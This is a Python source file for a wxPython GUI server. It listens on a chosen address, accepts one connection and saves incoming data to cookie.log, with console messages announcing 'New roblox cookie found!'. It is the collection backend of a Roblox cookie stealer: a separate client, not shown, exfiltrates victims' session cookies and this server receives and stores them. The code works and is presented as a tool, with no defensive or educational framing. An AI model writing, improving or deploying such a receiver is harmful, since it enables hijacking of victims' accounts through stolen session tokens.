# /usr/bin/env python3
# Path: Server.py

from datetime import datetime
import json
import socket
import threading
import wx
import subprocess


from modules.template import GUIserver


def get_config():
    with open('config.json') as f:
        return json.load(f)


class Frame(GUIserver):
    def __init__(self, parent, title):
        super(Frame, self).__init__(parent, title=title, size=(800, 800)) # initialize GUI

        # Bind buttons
        self.btnToggleRun.Bind(wx.EVT_BUTTON, self.onBtnToggleRun)
        self.tbIP.Bind(wx.EVT_TEXT_ENTER, self.onTextEnter)
        self.tbPORT.Bind(wx.EVT_TEXT_ENTER, self.onTextEnter)

        # print default messages
        self.tbConsole.AppendText('ProjectName  ' + get_config()['projectName'] + '\n')
        self.tbConsole.AppendText('version  ' + get_config()['version'] + '\n')
        self.tbConsole.AppendText('author  ' + get_config()['author'] + '\n')
        self.tbConsole.AppendText('description  ' + get_config()['description'] + '\n')


        self.tbConsole.AppendText("---------------------------\n")

        # display ipconfig
        try:
            self.tbConsole.AppendText(
                subprocess.check_output("ipconfig", shell=True).decode())
        except:
            pass

        

        self.Show()
        self.Centre()

    def onTextEnter(self, event):
        self.ADDR = (str(self.tbIP.GetValue()), int(self.tbPORT.GetValue()))

        ServerStartThread = threading.Thread(target=self.run)
        ServerStartThread.start()

    def onBtnToggleRun(self, event):
        """
            Toggle server run/stop [string]
        """

        RUN_SERVER_STRING = "Run Server"
        STOP_SERVER_STRING = "Stop Server"

        if self.btnToggleRun.Label.startswith("Run"): # if server is not running
            try: # try to start server
                self.onStartServer()
                self.btnToggleRun.Label = STOP_SERVER_STRING
            except: # if failed, do not change status
                self.btnToggleRun.label = "Run Server"
        else:
            try:
                self.stop(event)
                self.btnToggleRun.Label = RUN_SERVER_STRING
            except:
                self.btnToggleRun.Label = STOP_SERVER_STRING

    def onStartServer(self):
        try:
            self.tbConsole.Clear() # clear console

            # get address info
            addr_ip = str(self.tbIP.GetLineText(0))
            addr_port = int(self.tbPORT.GetLineText(0))

            # set address value (self.ADDR)
            self.ADDR = (str(addr_ip), int(addr_port))

        except Exception as e:
            self.print(e)
            return

        # start server

        ServerStartThread = threading.Thread(
            target=self.run)
        ServerStartThread.start()

    def run(self):
        self.tbConsole.Clear() # clear console
        addr = self.ADDR # initialize address

        try: # try to connect
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.bind(addr)
            self.s.listen(10) # listens for 10 connections

        except Exception as e:  # exception while connecting
            self.print(e)
            return

        # successfuly connected
        wx.MessageBox("Server started successfully!")
        self.print(
            f"Server Started! (Server is listening at {addr[0]}:{addr[1]})")

        # accept connection
        sock, ad = self.s.accept()  # NEW CONNECTION FOUND

        self.print(
            f"New connection found at {ad}"
        )

        while True:
            data = sock.recv(1024).decode() # get data from client
            if not data:
                break
            if data == 'False':
                '''
                    If client sends 'False', server will close connection
                '''
                self.print("No cookie found!")
                break

            self.print(f"New roblox cookie found!")
            self.print("Saving cookie as log...")
            if self.saveLog(data): # successfuly saved
                self.print("Cookie saved successfully!")
            break
        sock.close()

    def stop(self, event):
        try:
            self.s.close()
            wx.MessageBox("Server stopped successfully!")
            self.tbConsole.Clear()
        except Exception as e:
            self.print(e)
    

    def saveLog(self, cookie):
        """
            Save cookie as .log file
        """

        try:
            with open("cookie.log", "w") as f:
                f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
                f.write(cookie + "\n")
            return True
        except:
            self.print("Error while saving cookie log!")
            self.print(cookie)
            return False

    def print(self, string):
        """
            Print -string- at console.
        """
        if self.tbConsole.GetLineText(0):
            self.tbConsole.AppendText("\n")
        self.tbConsole.AppendText(string)


if __name__ == '__main__':
    app = wx.App()
    frame = Frame(None,  '')
    app.MainLoop()
